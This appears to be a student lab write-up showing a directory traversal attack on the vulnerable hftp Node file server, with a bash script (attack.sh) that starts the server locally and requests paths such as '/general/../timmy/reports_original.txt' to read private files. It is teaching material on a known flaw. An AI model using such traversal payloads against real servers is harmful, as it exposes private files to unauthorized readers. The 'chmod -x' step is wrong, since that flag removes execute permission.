# Directory-Traversal
This lab demonstrates a *directory traversal* vulnerability against a simple file server. By sending crafted requests from the `/general/` webroot we were able to read private files stored in sibling directories (e.g. `/wanda/`, `/timmy/`, `/cosmo/`). The experiment is reproducible using `attack.sh` which starts the server, runs the attack payload, and cleans up.

## Goal
- Show that a vulnerable file‑server exposes private files when given crafted path input (a directory‑traversal attack), and identify which private files were accessed from the server’s network traffic.
- Extend the contents of attack.sh -- a bash script which will spin up an ftp server to host the suspect companies files -- and augment the script to examine the contents of directories and files until you find what you are looking for

## Set Up
First confirm contents of start-server.js:
var pkg = require('/usr/local/lib/node_modules/hftp');

The above will ensure our FTP server starts up correctly once you have completed and run `attack.sh`

To get a sense of what the ftp server is doing, go back to the `ftp_folder` and run `node scripts/start-server.js`

Running `node scripts/start-server.js` manually starts the **file/HTTP server** (`hftp`) that serves the `ftp_folder` workspace on `localhost:8888`. You run it manually to **verify the server starts correctly**, see its startup messages and logs, confirm the listening port and workspace, and debug any errors before automating the attack with `attack.sh`.

## Why there is a server?

- The lab simulates a real service that serves files over the network (here it’s `hftp`/HTTP on `localhost:8888`).
    
- In real-world attacks, an adversary connects _over the network_ (not by logging into the machine) and requests files. The server is the service that responds to those network requests.
    
- Running the server in the VM gives you a **safe, controlled environment** to demonstrate the vulnerability end‑to‑end: client → network → server → file read → network response.
## Edit Attack Script
`vim attack.sh`

### Why the attack script (`attack.sh`) starts the server

- **Reproducibility:** `attack.sh` automates starting the server (so it’s available), runs the attack payload, captures output, and then cleans up. One command = entire experiment.
    
- **Avoids human error:** If you manually start the server one way and an instructor starts it another, results vary. The script standardizes the environment.
    
- **Records evidence:** the script redirects server output to `server.log` and prints results so you can take screenshots or save text for submission.
    
- **Safe lifecycle:** the script kills the server afterward so you don’t leave processes running.

#### Step 1: Start the server
```Shell
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}hftp${NC}"
node scripts/start-server.js > server.log 2>&1 &
vulnpid=$!
```
**What:**

- Prints a status line.
    
- Runs the Node server (`start-server.js`) in the background, redirecting stdout/stderr to `server.log`.
    
- Stores the background process id in `vulnpid`.
    

**Why:**

- The attack needs a running file server to target. Backgrounding (`&`) lets the script continue to the attack step while the server stays up.
    
- Capturing logs (`server.log`) helps debugging.
    
- Saving the PID lets you kill the server later.
    

**Checks / expectations:**

- `server.log` should contain the startup message (`Static file server running at ...`).
    
- If `node` fails or `hftp` missing, the log (or foreground run) will show an error.

#### Step 2

```Shell
sleep 2
echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"
```
**What:** Pauses 2 seconds, then prints the current working directory.

**Why:** The server may need a moment to bind to port 8888. `sleep` reduces race conditions where the attack runs before the server is ready.

**Checks / expectations:**

- If `attack.js` returns connection errors immediately after sleep, increase the wait or inspect `server.log`.

#### Step 3
```Shell
ATTACK_PATH=${1:-"http://localhost:8888/general/../../timmy/reports_original.txt"}

echo -e "\t[${GREEN}using attack path${NC}]: ${BLUE}$ATTACK_PATH${NC}"
```
**What:**

- Sets `ATTACK_PATH` to the 1st script argument if provided; otherwise uses a default URL.
    
- Prints which path will be used.
    

**Why:** Allows quick re-use and experimentation: run `./attack.sh "URL"` to try different payloads without editing the script.

**Checks / expectations:**

- If you run `./attack.sh` with no args and the default fails (404), call the script with an explicit correct path:  
    `./attack.sh "http://localhost:8888/general/../timmy/reports_original.txt"`

```Shell
node scripts/attack.js "$ATTACK_PATH"
```
*What:** Invokes the attack client (Node script) with the chosen URL/path.

**Why:** `attack.js` is the component that actually issues the HTTP request to the server (and prints the server response/file contents). This is the exploitation step.

**Checks / expectations:**

- Successful run → `attack.js` prints the file contents (or a success message).
    
- Failure → `404 Not Found`, `403`, `connection refused`, or an error printed by Node. Use `server.log` and `ls` to debug.

#### Step 4
```Shell
echo -e "\t[${GREEN}cleaning up${NC}]: killing server (pid $vulnpid)"
kill -9 $vulnpid 2>/dev/null || true
echo -e "\t[${GREEN}done${NC}]"
```
**What:** Prints cleanup message, attempts to kill the background server PID, suppresses error output, and finishes.

**Why:** Ensures the server isn’t left running and frees port 8888 for other runs. The `2>/dev/null || true` makes cleanup quiet and non-fatal if the process is already gone.

**Checks / expectations:**

- After the script ends, `ss -ltnp | grep 8888` should show no process listening.
    
- If server persists, use `ps aux | grep start-server.js` and `kill <pid>`.

## Complete File
`attack.sh` automates the experiment: start the server, wait, run a directory-traversal request (via `attack.js`) against the server with a specified path, then kill the server and print results — repeatable, reproducible, and easy to submit.


```Shell
#!/bin/bash
# These lines help the output print in color!
RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

### Step 1: Start the server
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}hftp${NC}"

node scripts/start-server.js > server.log 2>&1 &


vulnpid=$!

### Step 2: Wait for the server to get started

sleep 2

echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"

### Step 3: Perform directory attack

ATTACK_PATH=${1:-"http://localhost:8888/general/../timmy/reports_original.txt"}


echo -e "\t[${GREEN}using attack path${NC}]: ${BLUE}$ATTACK_PATH${NC}"

node scripts/attack.js "$ATTACK_PATH"


### Step 4: Clean up the vulnerable npm package's process

echo -e "\t[${GREEN}cleaning up${NC}]: killing server (pid $vulnpid)"

kill -9 $vulnpid 2>/dev/null || true

echo -e "\t[${GREEN}done${NC}]"
```
## Run Attacks
- Make sure attacks are first executable via `chmod -x attack.sh`
- Then run attacks `./attack.sh` or a specified path

<img width="1021" height="316" alt="image-183" src="https://github.com/user-attachments/assets/a6ce8f4d-0371-4d58-919a-0b4b8ebbae48" />

The server does not canonicalize and restrict file paths correctly. By requesting sibling paths from /general/ (e.g., ../wanda/...) the server returned files that are outside the intended public directory. This is a classic directory traversal vulnerability that allows an attacker to read sensitive files over the network.
Ultimately, the server returned `reports_original.txt` from `/wanda/`, `/timmy/`, and `/cosmo/`, demonstrating an unauthorized exposure of sensitive data.


  
